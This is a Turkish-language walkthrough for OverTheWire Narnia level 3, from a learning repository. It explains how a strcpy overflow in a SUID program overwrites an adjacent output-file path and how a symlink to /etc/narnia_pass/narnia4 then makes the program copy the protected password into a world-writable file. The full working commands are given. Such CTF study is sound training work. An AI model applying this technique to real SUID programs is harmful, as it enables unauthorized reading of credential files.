# 💥 OverTheWire Narnia — Level 3 → Level 4
## Komşu Buffer'ı Taşırmak + Sembolik Link

> Bu level'da ne EIP ele geçiriyoruz ne shellcode yazıyoruz. Bunun yerine
> narnia0'daki fikri kullanıyoruz — bir buffer'ı taşırıp **bitişikteki
> değişkeni** eziyoruz. Ama bu sefer ezdiğimiz değişken bir **dosya yolu**;
> sembolik link ile birleşince program bizim için şifreyi okuyup
> erişebileceğimiz bir yere kopyalıyor.

| | |
|---|---|
| **Bağlantı** | `ssh narnia3@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia3.c` · binary: `/narnia/narnia3` |
| **Kavram** | Bitişik buffer overflow → dosya yolu ezme + symlink + SUID |
| **Zorluk** | ⭐⭐⭐☆☆ |

**Bu level için gereken konular:**
- [`01_bellek_ve_memory_layout.md`](../../konu_anlatimlari/binary_exploitation/01_bellek_ve_memory_layout.md) — değişken komşuluğu (narnia0 ile aynı fikir)
- [`07_sembolik_link.md`](../../konu_anlatimlari/binary_exploitation/07_sembolik_link.md) — sembolik link nedir, neden işe yarar

---

## 🎯 Hedef

Program bir dosyanın içeriğini `/dev/null`'a (yani çöpe) kopyalıyor. Girdi dosyasının adını biz veriyoruz ama çıktı `/dev/null` olarak **sabit**. İnsecure `strcpy` sayesinde girdi dosyası adını taşırıp **çıktı dosyasını da ele geçireceğiz**. Girdi dosyasını (symlink ile) narnia4 şifresine, çıktıyı da bizim okuyabileceğimiz bir dosyaya yönlendirip şifreyi sızdıracağız.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int  ifd, ofd;
    char ofile[16] = "/dev/null";   // çıktı dosyası — SABİT (şimdilik)
    char ifile[32];                 // girdi dosyası adı — argv[1]'den gelir
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n", argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);                       // ← AÇIK: sınır kontrolü YOK
    if((ofd = open(ofile, O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);                // ifile'dan 31 byte oku
    write(ofd, buf, sizeof(buf)-1);               // ofile'a 31 byte yaz
    printf("copied contents of %s to a safer place... (%s)\n", ifile, ofile);

    close(ifd);
    close(ofd);
    exit(1);
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

```c
char ofile[16] = "/dev/null";
char ifile[32];
strcpy(ifile, argv[1]);   // sınır yok
```

Burada **EIP'yi ezmiyoruz**. Açık, narnia0'daki gibi: `strcpy` `ifile`'ı (32 byte) sınır kontrol etmeden dolduruyor, fazlalık **bitişikteki `ofile`'a** taşıyor. Stack'te `ifile` hemen `ofile`'ın altında (düşük adreste) durur:

```
Düşük adres → [ ifile (32 byte) ][ ofile (16 byte) = "/dev/null" ] → Yüksek adres
                ^strcpy buradan yazmaya başlar    ^33. byte buraya taşar
```

`strcpy` iki string'i de **aynı bitişik bloğa** yazdığı için iki ince numara çıkıyor:

- `ifile` string'i (ifile[0]'dan null'a kadar) aslında **ofile'a kadar uzanır** — yani `argv[1]`'in tamamı. `open(ifile)` bu tam yolu açar.
- `ofile` string'i (ofile[0]'dan null'a kadar) ise **taşan kısımdır** — yani `argv[1]`'in 32. byte'tan sonrası. `open(ofile)` bunu açar.

Yani **tek bir argümanla hem girdi hem çıktı dosyasını kontrol ediyoruz.** İşte saldırı bu.

> 💡 **Neden bu şifreyi okumamızı sağlıyor?** narnia3 binary'si **SUID narnia4**'tür; yani çalışırken `euid = narnia4`. Şifre dosyası `/etc/narnia_pass/narnia4` sadece narnia4 tarafından okunabilir — biz (narnia3) doğrudan okuyamayız. Ama programı `ifile`'ı o dosyaya bağlı bir **symlink** yapacak şekilde kandırırsak, program onu **narnia4 yetkisiyle** okur ve bizim erişebileceğimiz bir dosyaya kopyalar. Symlink, yetki köprüsü görevi görür.

---

## 📚 Gereken Teori (özet)

**Bitişik değişken ezme.** narnia0'da `buf`'ı taşırıp `val`'i ezmiştik. Burada `ifile`'ı taşırıp `ofile`'ı eziyoruz — aynı mekanizma, farklı hedef.

**Sembolik link (symlink).** Başka bir yolu işaret eden özel bir dosya. `open()` bir symlink'i açtığında onu **takip eder** ve hedefteki gerçek dosyayı açar. Linux'ta symlink'i takip etmek için symlink'in kendi izinleri önemli değildir — hedefin izinleri geçerlidir. Bu yüzden narnia4'e ait şifre dosyasına bir symlink kurarsak, SUID program onu narnia4 yetkisiyle takip edip okur.

---

## 🧪 Adım Adım — Saldırı Planı

Hedefimiz `argv[1]`'i öyle kurmak ki:
- **Tamamı** = narnia4 şifresine bağlı bir symlink adı → `ifile` bunu okur.
- **32. byte'tan sonrası** = bizim yazılabilir bir dosyamızın adı → `ofile` buna yazar.

En basit kurgu: `argv[1]` = `"A"*32 + "B"` (33 karakter). Böylece:
- `ifile` (tam string) = `"AAAA...AAAB"` → bunu symlink yapacağız → narnia4 şifresi
- `ofile` (taşan kısım) = `"B"` → bunu yazılabilir bir dosya yapacağız

```bash
# 1. Yazılabilir bir çalışma dizini (mkdir → 755, SUID süreç içine girebilir)
narnia3@narnia:/narnia$ mkdir /tmp/n3 && cd /tmp/n3

# argv[1] = 32 'A' + 'B'  (33 karakter)
narnia3@narnia:/tmp/n3$ NAME="$(python3 -c 'print("A"*32 + "B")')"

# 2. Symlink: adı NAME, hedefi narnia4 şifresi → ifile bunu okuyacak
narnia3@narnia:/tmp/n3$ ln -s /etc/narnia_pass/narnia4 "$NAME"

# 3. Taşan kısım "B" → çıktı dosyası. Var olmalı VE SUID sürecin (euid=narnia4)
#    yazabilmesi için herkese açık olmalı:
narnia3@narnia:/tmp/n3$ touch B && chmod 666 B
```

---

## ▶️ Çalıştırma

```bash
# ifile = symlink (→ narnia4 şifresi),  ofile = "B"
narnia3@narnia:/tmp/n3$ /narnia/narnia3 "$NAME"
copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB to a safer place... (B)

narnia3@narnia:/tmp/n3$ cat B
<şifre buraya gelir>
```

Program şifreyi narnia4 yetkisiyle okuyup `B`'ye yazdı; biz de `B`'yi okuduk. Şifreyi kopyala, narnia4'e geç.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. Çıktı dosyasına `chmod` vermeyi unutmak (en sık hata).**
SUID program `euid = narnia4` ile çalışır. `B` senin sahip olduğun bir dosya (narnia3); narnia4 ona ancak "diğerleri" (`other`) yazma izni varsa yazabilir. `chmod 666 B` (veya `777`) vermezsen `write` sessizce başarısız olur / `cat B` boş çıkar.

**2. Çalışma dizinini SUID sürecin gezemeyeceği izinle açmak.**
`mktemp -d` dizini `700` (sadece sahip) yapar → narnia4 içine giremez → `open` patlar. `mkdir /tmp/n3` (umask ile genelde `755`) kullan ki `other` dizini gezebilsin. Gerekirse `chmod 755 /tmp/n3`.

**3. Byte sayısını yanlış hesaplamak / stack sırasını varsaymak.**
Bu exploit `ifile`'ın hemen üstünde `ofile`'ın oturduğunu ve `ifile`'ın tam 32 byte olduğunu varsayar. Derleyici farklı dizdiyse dolgu değişir. **Doğrula:** `ltrace ./narnia3 testdosyasi` çıktısında `strcpy(adres, ...)` ve `open(...)` adreslerine bak, ya da GDB'de `strcpy` sonrası `x/20wx $esp` çek.
```bash
narnia3@narnia:/narnia$ ltrace ./narnia3 /etc/narnia_pass/narnia4
strcpy(0xffffd688, "/etc/narnia_pass/narnia4")   # ifile'ın adresi
open("/dev/null", ...)                            # ofile hâlâ /dev/null (taşma yok)
open("/etc/narnia_pass/narnia4", ...) = -1        # ifile bu, ama 32 byte'a sığdı, ofile değişmedi
```

**4. Symlink'i yanlış dizinde aramak.**
`ln -s` ile oluşturduğun symlink **cwd'de** (relatif) olur; programı da aynı dizinden çalıştır. `cd /tmp/n3` yaptıktan sonra `/narnia/narnia3 "$NAME"` (relatif `"$NAME"`).

**5. Çıktı dosyasının uzunluğu.**
Program 31 byte (`sizeof(buf)-1`) yazar; narnia şifreleri kısa olduğu için bu yeterlidir, `cat B` şifreyi gösterir (sonunda birkaç boş/çöp byte olabilir, normal).

---

## ✅ Ne Öğrendik

- Buffer overflow her zaman EIP ele geçirmek demek değildir — bazen **bitişik bir veriyi** (burada bir dosya yolunu) ezmek yeter (narnia0'ın akrabası).
- Tek bir taşan string ile **iki ayrı değişkeni** (ifile + ofile) aynı anda kontrol edebiliriz.
- **Symlink**, SUID bir programı, normalde okuyamayacağımız bir dosyayı **bizim adımıza** okumaya kandırmak için güçlü bir araçtır (yetki köprüsü).
- SUID programlarla dosya oluştururken **izinler (chmod) ve dizin gezme hakkı** kritiktir — süreç `euid` ile erişir.

Bir sonraki level narnia2'ye benziyor (EIP + shellcode) ama bir farkla: program **tüm environment variable'ları siliyor**, o yüzden shellcode'u env'e koyamayız — buffer'ın içine koymak zorunda kalacağız.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 2 → Level 3 — EIP Kontrolü + NOP Sled](./narnia_2-3.md)
- **Sonraki:** [Level 4 → Level 5 — Ortam Temizlenmiş Overflow](./narnia_4-5.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
